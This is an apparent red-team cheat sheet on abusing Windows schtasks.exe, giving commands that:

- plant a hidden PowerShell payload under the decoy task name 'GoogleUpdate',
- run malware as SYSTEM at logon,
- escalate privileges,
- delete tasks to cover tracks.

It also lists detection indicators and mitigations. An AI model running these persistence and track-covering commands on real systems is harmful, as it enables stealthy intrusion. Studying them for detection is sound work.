# ⏰ Schtasks - Living Off the Land

**Schtasks.exe** is a native Windows binary used to create, modify, or delete scheduled tasks. It is often abused by attackers to **persist payloads**, **elevate privileges**, or **execute malware at regular intervals or on boot.**

> ⚠️ These commands are intended for red team education and lab use only.

---

## 🛠️ What It Does
- Creates scheduled tasks to run commands or scripts
- Can trigger tasks at startup, logon, or custom intervals
- Works with local or remote systems
- Enables persistent execution with high stealth

---

## 💣 Common LotL Schtasks Techniques

### 1. Create a Recurring Payload Task
```cmd
schtasks /create /tn "GoogleUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\payload.ps1" /sc minute /mo 15 /f
```
✅ Runs PowerShell payload every 15 minutes under a legit-looking task name

---

### 2. Run Payload on User Logon
```cmd
schtasks /create /tn "UserLogonCheck" /tr "C:\Users\Public\malware.exe" /sc onlogon /ru SYSTEM /f
```
✅ Achieves persistence by launching payload every logon — as SYSTEM

---

### 3. Use Scheduled Task for Privilege Escalation
```cmd
schtasks /create /tn "ElevateShell" /tr "cmd.exe /c whoami > C:\elevated.txt" /sc once /st 00:00 /ru SYSTEM /f
```
✅ Executes command as SYSTEM — useful in local privilege escalation chains

---

### 4. Enumerate Existing Tasks
```cmd
schtasks /query /fo LIST /v
```
✅ Reveals system tasks, timing, users, and scripts

---

### 5. Delete a Malicious Task to Cover Tracks
```cmd
schtasks /delete /tn "GoogleUpdate" /f
```
✅ Removes evidence of persistence after payload has done its job

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Suspicious `/create` usage | Monitor new tasks created by unknown users or off-hours |
| Legit names, shady payloads | Detect mismatches like `GoogleUpdate` calling PowerShell or C:\Public |
| SYSTEM-level tasks by users | Flag tasks created with elevated rights from non-admin accounts |
| Tasks executing PowerShell, mshta, certutil | Correlate with other known LoLBin usage

---

## 🔐 Mitigation Strategies
- Restrict task creation to administrators using GPO
- Monitor and alert on new or modified tasks (Event ID 4698)
- Periodically audit scheduled task registry keys
- Use EDR to detect suspicious task scheduling behavior

---

> 📌 Combine `schtasks` with PowerShell, certutil, or BITSAdmin to create resilient malware chains. This method is commonly used by APTs and malware like TrickBot, Emotet, and Cobalt Strike droppers.
